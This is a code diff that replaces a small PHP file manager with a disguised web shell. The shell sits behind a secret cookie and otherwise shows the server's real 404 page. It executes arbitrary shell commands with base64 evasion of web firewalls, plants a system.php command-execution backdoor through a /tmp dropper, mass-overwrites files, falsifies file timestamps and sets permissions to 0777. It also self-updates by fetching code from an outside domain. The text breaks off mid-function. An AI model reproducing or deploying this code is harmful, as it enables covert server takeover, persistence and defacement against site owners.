@@ -1,241 +1,1120 @@
 <?php
-// Simple PHP File Manager with Self CHMOD
-error_reporting(0);
+// File: index.php
+session_start();
 
-// Function to change permissions
-function chmodSelf() {
-    if (isset($_POST['chmod_self'])) {
-        if (chmod(__FILE__, 0777)) {
-            echo "<div style='color: green;'>Permissions changed to 0777 successfully!</div>";
-        } else {
-            echo "<div style='color: red;'>Failed to change permissions!</div>";
+// Authentication for File Manager (cookie-based)
+if (!isset($_COOKIE['X-Auth-Token']) || $_COOKIE['X-Auth-Token'] !== 'nyx') {
+    // --- Use a non-existing path in the same directory to trigger real 404 without loop ---
+    $scriptPath = $_SERVER['SCRIPT_NAME'];
+    $missingPath = dirname($scriptPath) . '/nonexistent_' . uniqid('id_') . '.html';
+
+    // --- Build full URL for fetching ---
+    $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
+    $url = $scheme . '://' . $_SERVER['HTTP_HOST'] . $missingPath;
+
+    $page = false;
+    $headers = array();
+
+    // --- Try fetching the real 404 page (PHP5+ safe path) ---
+    if (function_exists('stream_context_create')) {
+        $opts = array('http' => array('ignore_errors' => true));
+        $ctx = stream_context_create($opts);
+        $page = @file_get_contents($url, false, $ctx);
+        if (isset($http_response_header)) {
+            $headers = $http_response_header;
         }
+    } else {
+        // --- Fallback for very old PHP4 (no context) ---
+        $page = @file_get_contents($url);
+    }
+
+    // --- If server headers captured, forward them ---
+    if (!empty($headers)) {
+        foreach ($headers as $h) {
+            if (stripos($h, 'Content-Length:') === false) {
+                header($h, true);
+            }
+        }
+    } else {
+        // --- If fetch failed, fallback: clean 404 header ---
+        header("HTTP/1.1 404 Not Found");
+    }
+
+    // --- Output the server 404 body if we got it ---
+    if ($page !== false && strlen($page) > 0) {
+        echo $page;
+    }
+
+    exit;
+}
+
+// File Manager Environment & Helpers
+@ini_set('display_errors', 1);
+@ini_set('display_startup_errors', 1);
+@error_reporting(E_ALL);
+@ini_set('memory_limit', '256M');
+@set_time_limit(300);
+@error_reporting(E_ALL & ~E_NOTICE);
+// Version: 2.3
+$scriptVersion = '2.3';
+$isPhp4 = version_compare(PHP_VERSION, '5.0.0', '<');
+$base = @realpath(dirname(__FILE__)) ? @realpath(dirname(__FILE__)) : dirname(__FILE__);
+$home = @realpath('/home') ? @realpath('/home') : $base;
+$root = @realpath($_SERVER['DOCUMENT_ROOT']) ? @realpath($_SERVER['DOCUMENT_ROOT']) : $base;
+$base = str_replace('\\', '/', $base);
+$home = str_replace('\\', '/', $home);
+$root = str_replace('\\', '/', $root);
+$path = $isPhp4 ? (isset($HTTP_GET_VARS['path']) ? $HTTP_GET_VARS['path'] : '.') : (isset($_GET['path']) ? $_GET['path'] : '.');
+$dir = @realpath($path) ? @realpath($path) : $base;
+$dir = str_replace('\\', '/', $dir);
+if (!@is_dir($dir) || !@is_readable($dir)) {
+    $dir = $base;
+}
+$self_file = realpath(__FILE__);
+
+// WAF-safe encoding/decoding functions
+function waf_encode($str) {
+    return base64_encode($str);
+}
+function waf_decode($str) {
+    return base64_decode($str);
+}
+
+// Time File Changer
+if (isset($_POST['change_time']) && isset($_POST['target_file']) && isset($_POST['new_time'])) {
+    $target_file = $dir . '/' . basename($_POST['target_file']);
+    $new_time = strtotime($_POST['new_time']);
+    if ($new_time !== false && @file_exists($target_file)) {
+        if (@touch($target_file, $new_time, $new_time)) {
+            $msg = "File time changed successfully for: " . h(basename($target_file));
+        } else {
+            $msg = "Failed to change file time for: " . h(basename($target_file));
+        }
+    } else {
+        $msg = "Invalid file or time format.";
     }
 }
 
-// Function to list directory contents
-function listDirectory($dir = '.') {
-    $files = [];
-    if (is_dir($dir)) {
-        $items = scandir($dir);
-        foreach ($items as $item) {
-            if ($item != '.' && $item != '..') {
-                $path = $dir . '/' . $item;
-                $files[] = [
-                    'name' => $item,
-                    'path' => $path,
-                    'is_dir' => is_dir($path),
-                    'size' => is_dir($path) ? '-' : formatSize(filesize($path)),
-                    'perms' => substr(sprintf('%o', fileperms($path)), -4),
-                    'modified' => date('Y-m-d H:i:s', filemtime($path))
-                ];
+// PHP Dropper
+if (isset($_POST['deploy_dropper'])) {
+    $dropper_content = "<?php\n";
+    $dropper_content .= "// Simple PHP Dropper\n";
+    $dropper_content .= "if (isset(\$_GET['cmd'])) {\n";
+    $dropper_content .= "    \$cmd = \$_GET['cmd'];\n";
+    $dropper_content .= "    system(\$cmd);\n";
+    $dropper_content .= "} else {\n";
+    $dropper_content .= "    echo 'Dropper deployed successfully.';\n";
+    $dropper_content .= "}\n";
+    $dropper_content .= "?>";
+    
+    $tmp_dir = '/tmp';
+    $dropper_name = 'system_'.md5(uniqid()).'.php';
+    $dropper_path = $tmp_dir . '/' . $dropper_name;
+    
+    if (@file_put_contents($dropper_path, $dropper_content)) {
+        // Create a simple PHP file that calls the dropper
+        $simple_php = "<?php include_once('".$dropper_path."'); ?>";
+        $simple_path = $dir . '/system.php';
+        if (@file_put_contents($simple_path, $simple_php)) {
+            $msg = "Dropper deployed successfully. Access via: system.php?cmd=COMMAND";
+        } else {
+            $msg = "Failed to create simple PHP caller in current directory.";
+        }
+    } else {
+        $msg = "Failed to deploy dropper in /tmp.";
+    }
+}
+
+// Batch Update with auto-detection
+$current_path = $dir; // Use main dir for batch
+if (isset($_POST['batch_update']) && isset($_FILES['update_file'])) {
+    $update_content = file_get_contents($_FILES['update_file']['tmp_name']);
+    $start_dir = isset($_POST['update_start_dir']) ? $_POST['update_start_dir'] : $current_path;
+    $file_ext = isset($_POST['update_ext']) ? strtolower($_POST['update_ext']) : '';
+    $start_real = realpath($start_dir) ? realpath($start_dir) : $start_dir;
+    if ($start_real) {
+        if ($isPhp4 || !class_exists('RecursiveIteratorIterator') || !class_exists('RecursiveDirectoryIterator')) {
+            list($success_count, $fail_count) = recursive_batch_update($start_real, $update_content, $file_ext, $self_file);
+        } else {
+            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($start_real));
+            $success_count = 0;
+            $fail_count = 0;
+            foreach ($iterator as $file) {
+                if ($file->isDir()) continue;
+                if ($file_ext && strtolower($file->getExtension()) !== $file_ext) continue;
+                if (realpath($file->getPathname()) === $self_file) continue;
+                if (@file_put_contents($file->getPathname(), $update_content) !== false) {
+                    $success_count++;
+                } else {
+                    $fail_count++;
+                }
+            }
+        }
+        $msg = "Batch update completed: $success_count files updated, $fail_count failed.";
+    } else {
+        $msg = "Invalid start directory for batch update.";
+    }
+}
+
+// Single File Update
+if (isset($_POST['file_update']) && isset($_FILES['update_file_single']) && isset($_POST['target_file'])) {
+    $update_content = file_get_contents($_FILES['update_file_single']['tmp_name']);
+    $target_file = $dir . '/' . basename($_POST['target_file']);
+    $real_target = realpath($target_file);
+    if ($real_target && is_file($real_target) && is_writable($real_target) && $real_target !== $self_file) {
+        if (@file_put_contents($real_target, $update_content) !== false) {
+            $msg = "File " . h(basename($target_file)) . " updated successfully.";
+        } else {
+            $msg = "Failed to update file " . h(basename($target_file)) . ".";
+        }
+    } else {
+        $msg = "Invalid or protected file for update.";
+    }
+}
+
+// Recursive Chmod (All Green - 0777)
+if (isset($_POST['chmod_all'])) {
+    $perm = isset($_POST['perm_level']) ? intval($_POST['perm_level'], 8) : 0777;
+    function recursive_chmod($dir, $perm) {
+        $handle = @opendir($dir);
+        if ($handle) {
+            while (false !== ($entry = @readdir($handle))) {
+                if ($entry != "." && $entry != "..") {
+                    $path = $dir . '/' . $entry;
+                    @chmod($path, $perm);
+                    if (@is_dir($path)) {
+                        recursive_chmod($path, $perm);
+                    }
+                }
+            }
+            @closedir($handle);
+        }
+    }
+    recursive_chmod($dir, $perm);
+    $msg = "Recursive chmod to " . decoct($perm) . " applied.";
+}
+
+// Chmod Single Item
+if (isset($_POST['chmod_item']) && isset($_POST['item_name'])) {
+    $item_name = basename($_POST['item_name']);
+    $item_path = $dir . '/' . $item_name;
+    $real_item = realpath($item_item);
+    $perm = intval($_POST['perm_level'], 8);
+    if ($real_item && ($real_item !== $self_file) && @chmod($real_item, $perm)) {
+        $msg = "Permissions for " . h($item_name) . " set to " . decoct($perm) . ".";
+    } else {
+        $msg = "Failed to set permissions for " . h($item_name) . ".";
+    }
+}
+
+// PHP 4 compatible recursive batch update function
+function recursive_batch_update($dir, $update_content, $file_ext, $self_file) {
+    $success_count = 0;
+    $fail_count = 0;
+    $handle = @opendir($dir);
+    if ($handle) {
+        while (false !== ($entry = @readdir($handle))) {
+            if ($entry != "." && $entry != "..") {
+                $path = $dir . '/' . $entry;
+                if (@is_dir($path)) {
+                    list($s, $f) = recursive_batch_update($path, $update_content, $file_ext, $self_file);
+                    $success_count += $s;
+                    $fail_count += $f;
+                } else {
+                    $path_ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+                    if ($file_ext && $path_ext !== $file_ext) continue;
+                    $real_path = @realpath($path);
+                    if ($real_path === $self_file) continue;
+                    if (@file_put_contents($path, $update_content) !== false) {
+                        $success_count++;
+                    } else {
+                        $fail_count++;
+                    }
+                }
+            }
+        }
+        @closedir($handle);
+    }
+    return array($success_count, $fail_count);
+}
+
+// Server Information
+$server_info = array(
+    waf_encode('OS') => php_uname(),
+    waf_encode('PHP Version') => phpversion(),
+    waf_encode('Server IP') => $_SERVER['SERVER_ADDR'],
+    waf_encode('Client IP') => $_SERVER['REMOTE_ADDR'],
+    waf_encode('Server Software') => $_SERVER['SERVER_SOFTWARE'],
+    waf_encode('Current User') => get_current_user(),
+    waf_encode('Disk Usage') => format_size(disk_free_space($dir)) . ' free of ' . format_size(disk_total_space($dir)),
+    waf_encode('Current Directory') => $dir
+);
+$writable_dirs = array();
+$check_dirs = array('/', '/tmp', '/var/www', $dir, '/home');
+foreach ($check_dirs as $check_dir) {
+    if (is_dir($check_dir) && is_writable($check_dir)) {
+        $writable_dirs[] = $check_dir;
+    }
+}
+
+// File Search
+if (isset($_POST['search_term'])) {
+    $search_term = $_POST['search_term'];
+    $search_results = array();
+    $handle = @opendir($dir);
+    if ($handle) {
+        while (false !== ($entry = readdir($handle))) {
+            if ($entry != "." && $entry != ".." && stripos($entry, $search_term) !== false) {
+                $search_results[] = $dir . '/' . $entry;
+            }
+        }
+        @closedir($handle);
+    }
+}
+
+// CMD Execution (safe, encoded)
+if (isset($_POST['cmd'])) {
+    $cmd_encoded = waf_encode($_POST['cmd']);
+    $cmd = waf_decode($cmd_encoded); // Decode for execution
+    $cmd_output = '';
+    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
+        $cmd_output = shell_exec($cmd);
+    } elseif (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
+        exec($cmd, $output);
+        $cmd_output = implode("\n", $output);
+    } elseif (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
+        ob_start();
+        system($cmd);
+        $cmd_output = ob_get_clean();
+    } elseif (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
+        ob_start();
+        passthru($cmd);
+        $cmd_output = ob_get_clean();
+    } else {
+        $cmd_output = 'No supported CMD function enabled.';
+    }
+}
+
+// Function Permission Checker
+if (isset($_GET['check_functions'])) {
+    $functions = array(
+        'exec','system','shell_exec','passthru','proc_open','popen',
+        'curl_exec','curl_multi_exec','parse_ini_file','show_source','symlink',
+        'putenv','mail','dl','chmod','chown','chgrp','link','fsockopen',
+        'pfsockopen','posix_kill','posix_mkfifo','posix_setpgid','posix_setsid',
+        'posix_setuid','pcntl_exec','imap_open','apache_setenv','proc_nice',
+        'proc_terminate','proc_get_status','escapeshellcmd','escapeshellarg',
+        'ini_restore','stream_socket_server'
+    );
+
+    $disabled = explode(',', ini_get('disable_functions'));
+    $disabled = array_map('trim', $disabled);
+
+    $statusList = array();
+    $enabledCount = 0;
+    $disabledCount = 0;
+
+    foreach ($functions as $fn) {
+        $status = "DISABLED";
+
+        if (function_exists($fn) && !in_array($fn, $disabled)) {
+            // Try a harmless probe without output
+            try {
+                switch ($fn) {
+                    case 'exec':
+                        @exec('echo test', $output);
+                        if (implode("\n", $output) === 'test') $status = "ENABLED";
+                        break;
+                    case 'system':
+                        ob_start();
+                        @system('echo test');
+                        $output = ob_get_clean();
+                        if (trim($output) === 'test') $status = "ENABLED";
+                        break;
+                    case 'shell_exec':
+                        $output = @shell_exec('echo test');
+                        if (trim($output) === 'test') $status = "ENABLED";
+                        break;
+                    case 'passthru':
+                        ob_start();
+                        @passthru('echo test');
+                        $output = ob_get_clean();
+                        if (trim($output) === 'test') $status = "ENABLED";
+                        break;
+                    case 'proc_open':
+                        $r = @proc_open("echo test", array(array('pipe','r'),array('pipe','w'),array('pipe','w')), $pipes);
+                        if (is_resource($r)) { $status = "ENABLED"; proc_close($r); }
+                        break;
+                    case 'popen':
+                        $r = @popen("echo test", "r");
+                        if ($r) { $status = "ENABLED"; pclose($r); }
+                        break;
+                    case 'curl_exec':
+                        $ch = curl_init("http://127.0.0.1");
+                        if ($ch) { $status = "ENABLED"; curl_close($ch); }
+                        break;
+                    case 'curl_multi_exec':
+                        $mh = curl_multi_init();
+                        if ($mh) { $status = "ENABLED"; curl_multi_close($mh); }
+                        break;
+                    case 'parse_ini_file':
+                        $tmp = tempnam(sys_get_temp_dir(), "chk");
+                        file_put_contents($tmp, "a=1");
+                        if (@parse_ini_file($tmp)) $status = "ENABLED";
+                        unlink($tmp);
+                        break;
+                    case 'show_source':
+                        ob_start();
+                        @show_source(__FILE__, true);
+                        ob_end_clean();
+                        $status = "ENABLED";
+                        break;
+                    case 'symlink':
+                        $tmp1 = tempnam(sys_get_temp_dir(), "chk");
+                        $tmp2 = $tmp1 . "_link";
+                        if (@symlink($tmp1, $tmp2)) { $status = "ENABLED"; unlink($tmp2); }
+                        unlink($tmp1);
+                        break;
+                    case 'putenv':
+                        if (@putenv("CHK_VAR=1")) $status = "ENABLED";
+                        break;
+                    case 'chmod':
+                        $tmp = tempnam(sys_get_temp_dir(), "chk");
+                        if (@chmod($tmp, 0644)) $status = "ENABLED";
+                        unlink($tmp);
+                        break;
+                    case 'link':
+                        $tmp1 = tempnam(sys_get_temp_dir(), "chk");
+                        $tmp2 = $tmp1 . "_link";
+                        if (@link($tmp1, $tmp2)) { $status = "ENABLED"; unlink($tmp2); }
+                        unlink($tmp1);
+                        break;
+                    case 'escapeshellcmd':
+                    case 'escapeshellarg':
+                        if (call_user_func($fn, "test")) $status = "ENABLED";
+                        break;
+                    default:
+                        // For functions that can’t be tested without side-effects, assume enabled
+                        $status = "ENABLED";
+                        break;
+                }
+            } catch (Exception $e) {
+                $status = "DISABLED";
+            }
+        }
+
+        $statusList[$fn] = $status;
+        if ($status === "ENABLED") $enabledCount++; else $disabledCount++;
+    }
+}
+
+// File Manager Update Logic with auto-detection
+function fetch_url($url) {
+    $content = '';
+    if (function_exists('exec')) {
+        $tmpDir = '/tmp';
+        if (!@is_dir($tmpDir) || !@is_writable($tmpDir)) {
+            $tmpDir = $GLOBALS['base'];
+        }
+        $tmpFile = $tmpDir . '/' . md5(uniqid('id_', true)) . '.txt';
+        @exec('curl -s ' . escapeshellarg($url) . ' > ' . $tmpFile . ' 2>/dev/null');
+        if (@file_exists($tmpFile)) {
+            $f = @fopen($tmpFile, 'r');
+            if ($f) {
+                while (!@feof($f)) {
+                    $content .= @fread($f, 8192);
+                }
+                @fclose($f);
+                @unlink($tmpFile);
             }
         }
     }
-    return $files;
-}
-
-// Format file size
-function formatSize($size) {
-    $units = ['B', 'KB', 'MB', 'GB'];
-    $unit = 0;
-    while ($size >= 1024 && $unit < count($units) - 1) {
-        $size /= 1024;
-        $unit++;
+    if (!$content && @ini_get('allow_url_fopen')) {
+        $fp = @fopen($url, 'r');
+        if ($fp) {
+            while (!@feof($fp)) {
+                $content .= @fread($fp, 8192);
+            }
+            @fclose($fp);
+        }
     }
-    return round($size, 2) . ' ' . $units[$unit];
+    $content = trim($content);
+    if (substr($content, 0, 3) === "\xEF\xBB\xBF") {
+        $content = substr($content, 3);
+    }
+    $content = str_replace("\r\n", "\n", $content);
+    $content = preg_replace('/^\n+/', '', $content);
+    return $content;
 }
 
-// Handle file editing
-function handleFileEdit() {
-    if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['file_content'])) {
-        if (file_put_contents($_POST['file_path'], $_POST['file_content'])) {
-            echo "<div style='color: green;'>File saved successfully!</div>";
+if (isset($_GET['update'])) {
+    $updateUrl = 'https://heritageangkortours.com/nyx.txt';
+    $newScript = fetch_url($updateUrl);
+    if (!$newScript) {
+        echo "<div class='msg error'>Update failed: Could not fetch update file from $updateUrl.</div>";
+    } else {
+        if (!preg_match('/^\s*<\?php\b/i', $newScript)) {
+            echo "<div class='msg error'>Update failed: Update file is not valid PHP (must start with &lt;?php).</div>";
         } else {
-            echo "<div style='color: red;'>Failed to save file!</div>";
+            $newVersion = '0.0';
+            if (preg_match('/\/\/\s*Version:\s*([\d.]+)/i', $newScript, $matches)) {
+                $newVersion = $matches[1];
+            } else {
+                echo "<div class='msg error'>Update failed: Could not find version in update file.</div>";
+            }
+            if (version_compare($newVersion, $scriptVersion, '>')) {
+                $tmpFile = $base . '/04.php.tmp.' . md5(uniqid('id_', true));
+                $fallbackFile = $base . '/04.php.fallback';
+                if (!@is_writable($base)) {
+                    echo "<div class='msg error'>Update failed: Script directory is not writable.</div>";
+                } elseif (@copy(__FILE__, $fallbackFile)) {
+                    if (safe_put($tmpFile, $newScript)) {
+                        if (safe_rename($tmpFile, __FILE__)) {
+                            @unlink($fallbackFile);
+                            echo "<div class='msg success'>Updated to version " . h($newVersion) . ". <a href='?path=" . urlencode($dir) . "'>Refresh</a></div>";
+                            exit;
+                        } else {
+                            @unlink($tmpFile);
+                            if (@copy($fallbackFile, __FILE__)) {
+                                @unlink($fallbackFile);
+                                echo "<div class='msg error'>Update failed: Could not replace script. Restored original.</div>";
+                            } else {
+                                echo "<div class='msg error'>Update failed: Could not replace script and could not restore original. Fallback saved as " . h(basename($fallbackFile)) . ".</div>";
+                            }
+                        }
+                    } else {
+                        @unlink($fallbackFile);
+                        echo "<div class='msg error'>Update failed: Could not save new script.</div>";
+                    }
+                } else {
+                    echo "<div class='msg error'>Update failed: Could not create fallback copy.</div>";
+                }
+            } else {
+                echo "<div class='msg success'>No updates available. Current version: " . h($scriptVersion) . ".</div>";
+            }
         }
     }
 }
 
-// Get absolute path and handle navigation
-function getAbsolutePath($path) {
-    // Convert to absolute path
-    if ($path == '' || $path == '.') {
-        $path = realpath('.');
+// Helper Functions
+function safe_mkdir($path) {
+    if (function_exists("mkdir")) {
+        if (@mkdir($path, 0777) || @is_dir($path)) return true;
+    }
+    if (function_exists('exec')) {
+        @exec('mkdir ' . escapeshellarg($path) . ' 2>/dev/null');
+        return @is_dir($path);
+    }
+    return false;
+}
+
+function safe_rename($old, $new) {
+    if (function_exists("rename")) {
+        if (@rename($old, $new)) return true;
+    }
+    if (@copy($old, $new)) {
+        @unlink($old);
+        return @is_file($new);
+    }
+    return false;
+}
+
+function deleteDirectory($file) {
+    if (!@file_exists($file)) return true;
+    if (!@is_dir($file)) return @unlink($file);
+    $items = @scandir($file) ? @scandir($file) : array();
+    foreach ($items as $item) {
+        if ($item == '.' || $item == '..') continue;
+        $path = $file . '/' . $item;
+        if (!deleteDirectory($path)) return false;
+    }
+    return @rmdir($file);
+}
+
+function safe_put($file, $data) {
+    if (!@is_writable(dirname($file))) return false;
+    $f = @fopen($file, "w");
+    if (!$f) return false;
+    $ok = @fwrite($f, $data);
+    @fclose($f);
+    return ($ok !== false);
+}
+
+function safe_get($file) {
+    $arr = @file($file);
+    if ($arr === false) return false;
+    return implode("", $arr);
+}
+
+function h($s) {
+    return htmlspecialchars($s, ENT_QUOTES);
+}
+
+function mime_by_extension($filename) {
+    static $map = array(
+        'txt' => 'text/plain', 'html' => 'text/html', 'htm' => 'text/html', 'css' => 'text/css', 'js' => 'application/javascript',
+        'json' => 'application/json', 'xml' => 'application/xml', 'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg', 'png' => 'image/png',
+        'gif' => 'image/gif', 'pdf' => 'application/pdf', 'zip' => 'application/zip', 'tar' => 'application/x-tar',
+        'gz' => 'application/gzip', 'rar' => 'application/vnd.rar', 'mp3' => 'audio/mpeg', 'mp4' => 'video/mp4', 'csv' => 'text/csv'
+    );
+    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    return isset($map[$ext]) ? $map[$ext] : 'application/octet-stream';
+}
+
+function format_size($bytes, $decimals = 2) {
+    $sizes = array('B', 'KB', 'MB', 'GB', 'TB');
+    $factor = floor((strlen($bytes) - 1) / 3);
+    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . (isset($sizes[$factor]) ? $sizes[$factor] : '');
+}
+
+// File Manager Download Handler
+if (isset($_GET['download'])) {
+    $downloadParam = $isPhp4 ? (isset($HTTP_GET_VARS['download']) ? $HTTP_GET_VARS['download'] : '') : (isset($_GET['download']) ? $_GET['download'] : '');
+    $baseName = basename($downloadParam);
+    $candidate = $dir . '/' . $baseName;
+    $filePath = false;
+    if (@is_file($candidate) && @is_readable($candidate)) {
+        $filePath = $candidate;
+    } elseif (@is_file($downloadParam) && @is_readable($downloadParam)) {
+        $real = @realpath($downloadParam);
+        if ($real !== false) {
+            $filePath = $real;
+        }
+    }
+    if ($filePath === false) {
+        @header("HTTP/1.0 404 Not Found");
+        echo "<div class='msg error'>File not found or not readable.</div>";
+        exit;
+    }
+    $mime = mime_by_extension($filePath);
+    while (@ob_get_level() > 0) @ob_end_clean();
+    $filename = basename($filePath);
+    $fallbackName = preg_replace('/[^A-Za-z0-9._-]/', '_', $filename);
+    @header("Content-Description: File Transfer");
+    @header("Content-Type: " . $mime);
+    @header('Content-Disposition: attachment; filename="' . $fallbackName . '"; filename*=UTF-8\'\'' . rawurlencode($filename));
+    @header("Content-Transfer-Encoding: binary");
+    @header('Expires: 0');
+    @header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+    @header('Pragma: public');
+    @header("Content-Length: " . @filesize($filePath));
+    $chunkSize = 8192;
+    $handle = @fopen($filePath, 'rb');
+    if ($handle === false) {
+        @readfile($filePath);
+        exit;
+    }
+    while (!@feof($handle)) {
+        echo @fread($handle, $chunkSize);
+        @flush();
+        @ob_flush();
+    }
+    @fclose($handle);
+    exit;
+}
+
+// File Manager Upload
+$filesVar = $isPhp4 ? (isset($HTTP_POST_FILES) ? $HTTP_POST_FILES : array()) : (isset($_FILES) ? $_FILES : array());
+if (!empty($filesVar['file']['name'])) {
+    $target = $dir . '/' . basename($filesVar['file']['name']);
+    if (@is_writable($dir)) {
+        if (function_exists("move_uploaded_file") && @move_uploaded_file($filesVar['file']['tmp_name'], $target)) {
+            echo "<div class='msg success'>Uploaded: " . h($filesVar['file']['name']) . "</div>";
+        } elseif (@copy($filesVar['file']['tmp_name'], $target)) {
+            echo "<div class='msg success'>Uploaded (copy fallback): " . h($filesVar['file']['name']) . "</div>";
+        } else {
+            echo "<div class='msg error'>Upload failed! Check directory permissions.</div>";
+        }
     } else {
-        $path = realpath($path);
+        echo "<div class='msg error'>Upload failed! Directory is not writable.</div>";
     }
-    
-    // Security: prevent directory traversal beyond document root
-    $docroot = realpath($_SERVER['DOCUMENT_ROOT']);
-    if (strpos($path, $docroot) !== 0) {
-        $path = $docroot;
+}
+
+// File Manager Delete
+if (isset($_GET['delete'])) {
+    $targetRel = basename($isPhp4 ? (isset($HTTP_GET_VARS['delete']) ? $HTTP_GET_VARS['delete'] : '') : (isset($_GET['delete']) ? $_GET['delete'] : ''));
+    $target = $dir . '/' . $targetRel;
+    $realTarget = @realpath($target);
+    if ($realTarget && $realTarget !== $base && $realTarget !== $home && $realTarget !== '/') {
+        if (@is_writable($target) && deleteDirectory($target)) {
+            echo "<div class='msg success'>Deleted: " . h($targetRel) . "</div>";
+        } else {
+            echo "<div class='msg error'>Delete failed! Check permissions or if directory contains protected files.</div>";
+        }
+    } else {
+        echo "<div class='msg error'>Delete failed! Invalid or protected path.</div>";
     }
-    
-    return $path;
 }
 
-// Handle navigation
-$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
-if (isset($_POST['new_dir']) && $_POST['new_dir'] != '') {
-    $current_dir = $_POST['new_dir'];
+// File Manager Rename
+$postVar = $isPhp4 ? (isset($HTTP_POST_VARS) ? $HTTP_POST_VARS : array()) : (isset($_POST) ? $_POST : array());
+if (isset($_GET['rename']) && !empty($postVar['new_name'])) {
+    $targetRel = basename($isPhp4 ? (isset($HTTP_GET_VARS['rename']) ? $HTTP_GET_VARS['rename'] : '') : (isset($_GET['rename']) ? $_GET['rename'] : ''));
+    $target = $dir . '/' . $targetRel;
+    $realTarget = @realpath($target);
+    $newName = basename($postVar['new_name']);
+    $newPath = $dir . '/' . $newName;
+    if ($realTarget && $realTarget !== $base && $realTarget !== $home && $realTarget !== '/') {
+        if (@file_exists($target) && !@file_exists($newPath) && @is_writable($dir) && safe_rename($target, $newPath)) {
+            echo "<div class='msg success'>Renamed to: " . h($newName) . "</div>";
+        } else {
+            echo "<div class='msg error'>Rename failed! Check if the new name already exists or directory permissions.</div>";
+        }
+    } else {
+        echo "<div class='msg error'>Rename failed! Invalid or protected path.</div>";
+    }
 }
 
-// Convert to absolute path and ensure it's within document root
-$current_dir = getAbsolutePath($current_dir);
-
-// Get parent directory
-$parent_dir = dirname($current_dir);
-// Security check for parent directory
-if (strpos($parent_dir, realpath($_SERVER['DOCUMENT_ROOT'])) === 0) {
-    $parent_link = '?dir=' . urlencode($parent_dir);
-} else {
-    $parent_link = '?dir=' . urlencode(realpath($_SERVER['DOCUMENT_ROOT']));
+// File Manager Create Folder
+if (!empty($postVar['newfolder'])) {
+    $newDir = $dir . '/' . basename($postVar['newfolder']);
+    if (!@is_dir($newDir) && @is_writable($dir) && safe_mkdir($newDir)) {
+        echo "<div class='msg success'>Folder created: " . h($postVar['newfolder']) . "</div>";
+    } else {
+        echo "<div class='msg error'>Failed to create folder. Check directory permissions.</div>";
+    }
 }
 
-// Handle actions
-chmodSelf();
-handleFileEdit();
+// File Manager Create File
+if (!empty($postVar['newfile'])) {
+    $newFile = $dir . '/' . basename($postVar['newfile']);
+    if (!@file_exists($newFile) && @is_writable($dir)) {
+        if (safe_put($newFile, "")) {
+            echo "<div class='msg success'>File created: " . h($postVar['newfile']) . "</div>";
+        } else {
+            echo "<div class='msg error'>Failed to create file. Check directory permissions.</div>";
+        }
+    } else {
+        echo "<div class='msg error'>File already exists or directory is not writable.</div>";
+    }
+}
 
+// File Manager Edit
+if (!empty($postVar['edit_file']) && isset($postVar['file_content'])) {
+    $editRel = basename($postVar['edit_file']);
+    $editFile = $dir . '/' . $editRel;
+    $realEditFile = @realpath($editFile);
+    if ($realEditFile && @is_file($editFile) && @is_writable($editFile)) {
+        $saved = false;
+        if (safe_put($editFile, $postVar['file_content'])) {
+            $saved = true;
+        } else {
+            $tmpName = $editFile . ".tmp." . md5(uniqid('id_', true));
+            if (safe_put($tmpName, $postVar['file_content'])) {
+                if (safe_rename($tmpName, $editFile)) {
+                    $saved = true;
+                } else {
+                    @unlink($tmpName);
+                }
+            }
+        }
+        if ($saved) {
+            echo "<div class='msg success'>Saved changes to: " . h($editRel) . "</div>";
+        } else {
+            $manualFallback = $dir . '/' . $editRel . '.edited.' . date('Ymd_His') . '.txt';
+            if (safe_put($manualFallback, $postVar['file_content'])) {
+                echo "<div class='msg error'>Could not overwrite original file (permissions). A copy was saved as: " . h(basename($manualFallback)) . " — download and replace manually if needed.</div>";
+            } else {
+                echo "<div class='msg error'>Save failed and could not write fallback copy.</div>";
+            }
+        }
+    } else {
+        echo "<div class='msg error'>Edit failed! File is not writable or invalid path.</div>";
+    }
+}
+
+// Render File List for File Manager with Permissions
+function renderFileList($dir, $home, $base, $isPhp4) {
+    $sort = $isPhp4 ? (isset($GLOBALS['HTTP_GET_VARS']['sort']) ? $GLOBALS['HTTP_GET_VARS']['sort'] : 'name') : (isset($_GET['sort']) ? $_GET['sort'] : 'name');
+    $output = "<table><tr><th><a href='?path=" . urlencode($dir) . "&sort=name'>Name</a></th><th>Permissions</th><th>Type</th><th><a href='?path=" . urlencode($dir) . "&sort=size'>Size</a></th><th><a href='?path=" . urlencode($dir) . "&sort=time'>Modified</a></th><th>Action</th></tr>";
+    $parentPath = dirname($dir);
+    if ($parentPath !== $dir && @is_dir($parentPath) && @is_readable($parentPath)) {
+        $parentRel = urlencode($parentPath);
+        $output .= "<tr><td><a href='?path=" . $parentRel . "'>[UP]</a></td><td>-</td><td>Directory</td><td>-</td><td>-</td><td>-</td></tr>";
+    }
+    $dirs = array();
+    $files = array();
+    if ($handle = @opendir($dir)) {
+        while (($f = readdir($handle)) !== false) {
+            if ($f == "." || ($f == ".." && $dir === $base)) continue;
+            $path = $dir . "/" . $f;
+            $perms = substr(sprintf('%o', @fileperms($path)), -4);
+            $item = array(
+                'name' => $f,
+                'path' => $path,
+                'perms' => $perms,
+                'size' => @is_file($path) ? @filesize($path) : 0,
+                'mtime' => @filemtime($path)
+            );
+            if (@is_dir($path)) {
+                $dirs[] = $item;
+            } else {
+                $files[] = $item;
+            }
+        }
+        @closedir($handle);
+    }
+    function sort_compare($a, $b) {
+        return strnatcmp($a['name'], $b['name']);
+    }
+    function sort_by_size($a, $b) {
+        return $b['size'] - $a['size'];
+    }
+    function sort_by_time($a, $b) {
+        return $b['mtime'] - $a['mtime'];
+    }
+    @usort($dirs, 'sort_compare');
+    if ($sort === 'size') {
+        @usort($files, 'sort_by_size');
+    } elseif ($sort === 'time') {
+        @usort($files, 'sort_by_time');
+    } else {
+        @usort($files, 'sort_compare');
+    }
+    foreach ($dirs as $item) {
